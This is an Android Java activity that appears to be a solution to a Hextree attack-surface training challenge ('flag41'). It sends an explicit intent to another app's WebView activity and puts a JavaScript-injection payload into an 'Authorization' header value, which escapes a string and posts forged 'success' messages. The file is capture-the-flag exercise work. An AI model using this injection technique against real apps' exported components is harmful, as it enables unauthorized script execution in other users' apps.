package com.android.zerohextree;

import android.content.Intent;
import android.os.Bundle;
import android.content.ComponentName;

import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;

import android.view.View;

import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.android.zerohextree.databinding.ActivityFlag41Binding;

public class flag41 extends AppCompatActivity {



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

//        Intent intent = new Intent();
//        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag41Activity");
//        intent.putExtra("URL", "https://maroon-veronica-9.tiiny.site/"); // Replace with your desired URL
//        startActivity(intent);

        Intent intent = new Intent();
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag41Activity"));
        intent.putExtra("URL", "https://oak.hackstree.io/android/webview/sync.html");

        Bundle headers = new Bundle();
        headers.putString("Authorization", "Bearer test\"); " +
                "window.parent.postMessage(JSON.stringify({ message: 'init_complete' }), '*'); " +
                "window.parent.postMessage(JSON.stringify({ message: 'success' }), '*'); //");

        intent.putExtra("com.android.browser.headers", headers);
        startActivity(intent);

    }


}